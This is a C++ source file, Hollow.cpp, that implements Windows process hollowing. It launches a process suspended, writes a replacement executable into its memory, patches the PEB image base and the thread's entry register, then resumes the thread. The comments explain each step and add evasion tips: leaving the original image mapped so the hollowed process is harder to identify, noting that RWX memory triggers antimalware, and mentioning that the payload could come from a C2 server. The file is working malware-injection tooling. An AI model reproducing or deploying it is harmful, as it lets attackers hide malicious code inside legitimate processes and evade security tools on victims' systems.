// Hollow.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <Psapi.h>
#include <ImageHlp.h>
#include <assert.h>

#pragma comment(lib, "imagehlp")
#pragma comment(lib, "ntdll")

PROCESS_INFORMATION pi; //set pi as a global variable as process_information type so it can be called from anywhere in the event of a failure

int Error(const char* text) {
	printf("%s (%u)\n", text, GetLastError());
	if(pi.hProcess)
		TerminateProcess(pi.hProcess, 0);
	return 1;
}

int main(int argc, char* argv[]) {
	if (argc < 3) {
		printf("Usage: Hollow <image_name> <replacement_exe>\n"); //specify name of image to create and the repacement executable code  (this can also be retrieved from a C2 asthe ocde can be stored in memory)
	}

	auto name = argv[1];
	auto replace = argv[2];

	STARTUPINFOA si = { sizeof(si) }; //here we use the size startup info as the si parameter as this sets the first filed to the size of the structure and zeros out the rest
	if (!CreateProcessA(nullptr, name, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) //here we have the name of exe to use (PATH is searched) - we use create_suspended for obvious reasons
		return Error("Failed to create process");

	printf("Created PID: %u\n", pi.dwProcessId);

	// for convenience, set current directory to where our EXE is
	WCHAR path[MAX_PATH];
	GetModuleFileName(nullptr, path, _countof(path));
	*wcsrchr(path, L'\\') = 0;
	SetCurrentDirectory(path);

	HANDLE hFile = CreateFileA(replace, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 
		nullptr, OPEN_EXISTING, 0, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
		return Error("Failed to open file");

	PVOID newAddress = VirtualAllocEx(pi.hProcess, nullptr, //allocate space inside the new process that is equal to the file size
		GetFileSize(hFile, nullptr) + (1 << 20),	// extra 1MB in case it's needed (when an executable is mapped into a processes it consumes are bit more than its initial size)
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //in a real scenario we would not provide the entire space with execute/write, we would apply the execute perms later and allow headers etc as read only (this way will trigger antimalware)
	if (!newAddress)
		return Error("Failed to allocate memory");

	printf("Address in target process: 0x%p\n", newAddress);

	ULONG orgSize, newSize;
	ULONG64 oldImageBase, newImageBase = (ULONG64)newAddress;

	if (!ReBaseImage64(replace, nullptr, TRUE, FALSE, FALSE, 0, //we call rebaseimage64 (part of imagehlp api) to rebase the entire image to a new address, this will ensure we will not have to remap functions to adresses etc
		&orgSize, &oldImageBase, &newSize, &newImageBase, 0))
		return Error("Failed to rebase image");

	HANDLE hMemFile = CreateFileMapping(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr); //createfilemapping to map the executable to our address space so we can copy it to the other address space
	if (!hMemFile)
		return Error("Failed to create MMF");

	CloseHandle(hFile);

	PVOID address = MapViewOfFileEx(hMemFile, FILE_MAP_READ, 0, 0, 0, newAddress); //mapviewoffileex to map the file into the same address as its mapped in the target process
							//there are two pointers, one points to the file in our process, and the other points to the address space we allocated
	if (!address)
		return Error("Failed to map in requested address");

	//below we will read the structures included by the headers, and copy the headers and various sections to the target process
	auto dosHeader = (PIMAGE_DOS_HEADER)address; //address is where we mapped our executable, we will cast it to image_dos_header
	auto nt = (PIMAGE_NT_HEADERS)((BYTE*)address + dosHeader->e_lfanew); //we obtain ptr to the offset of the new header address
	auto sections = (PIMAGE_SECTION_HEADER)(nt + 1); //we set sections by moving to the end of the headers (nt +1 moves to end of the header)

	SIZE_T written;
	// copy header
	WriteProcessMemory(pi.hProcess, (PVOID)newAddress, //here we copy the header from file to new executable
		(PVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfHeaders, &written); //size of headers

	// copy sections
	for (ULONG i = 0; i < nt->FileHeader.NumberOfSections; i++) { //for loop to copy out each section
		WriteProcessMemory(pi.hProcess, 
			PVOID((PBYTE)newAddress + sections[i].VirtualAddress), 
			PVOID(sections[i].PointerToRawData + nt->OptionalHeader.ImageBase), 
			sections[i].SizeOfRawData, &written);
	}

	// get PEB of target as we need to fix the image base inside the process environment block
	PROCESS_BASIC_INFORMATION pbi;
	NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr); //we need to retrieve the peb via processbasicinformation
	PVOID peb = pbi.PebBaseAddress;

	//below is an example of a "real" PEB
/*
	typedef struct _PEB {
		BOOLEAN InheritedAddressSpace;
		BOOLEAN ReadImageFileExecOptions;
		BOOLEAN BeingDebugged;
		BOOLEAN BitField;

		HANDLE Mutant;

		PVOID ImageBaseAddress;
		...
*/
	// update PEB with new image base
	//we do not unmap the original executable as this makes it harder to identify the process as hollow
	WriteProcessMemory(pi.hProcess, (PBYTE)peb + sizeof(PVOID) * 2, 
		&nt->OptionalHeader.ImageBase, sizeof(PVOID), &written);

	CONTEXT context;
	context.ContextFlags = CONTEXT_INTEGER;
	//now we tell the loader where to go next after thread resume
	GetThreadContext(pi.hThread, &context); //read thread 
#ifdef _WIN64
	// for x64, RCX points to the next instruction
	context.Rcx = (DWORD64)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD64)newAddress); //put entry point of new executable in rcx/ebx, this is where ntdll expects to go after resume thread is called in this context
#else
	// for x86, EBX points to the next instruction
	context.Ebx = (DWORD)(nt->OptionalHeader.AddressOfEntryPoint + (DWORD)newAddress); //take the new address in the target process and add the offset that is coming from the header
#endif
	SetThreadContext(pi.hThread, &context); //provide thread with new value

	UnmapViewOfFile(address);
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return 0;
}
